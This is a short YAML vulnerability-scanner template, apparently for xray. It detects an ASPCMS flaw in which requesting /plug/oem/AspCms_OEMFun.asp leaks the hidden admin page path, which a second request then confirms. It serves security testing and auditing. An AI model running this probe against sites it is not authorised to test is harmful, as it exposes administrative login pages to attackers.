expression: r0() && r1()
id: aspcms-backend-leak
info:
  author: Hzllaga
  description: app="ASPCMS"
  name: ASPCMS Backend Leak
  severity: low
  verified: true
rules:
  r0:
    expression: response.status == 200 && "<script>alert".bmatches(response.body)
      && "top.location.href='(.*?)';".bmatches(response.body)
    output:
      path: search["path"]
      search: '"(?P<path>(/(.*?).asp))".bsubmatch(response.body)'
    request:
      method: GET
      path: /plug/oem/AspCms_OEMFun.asp
  r1:
    expression: response.status == 200 && response.body.bcontains(b"username")
    request:
      method: GET
      path: /{{path}}
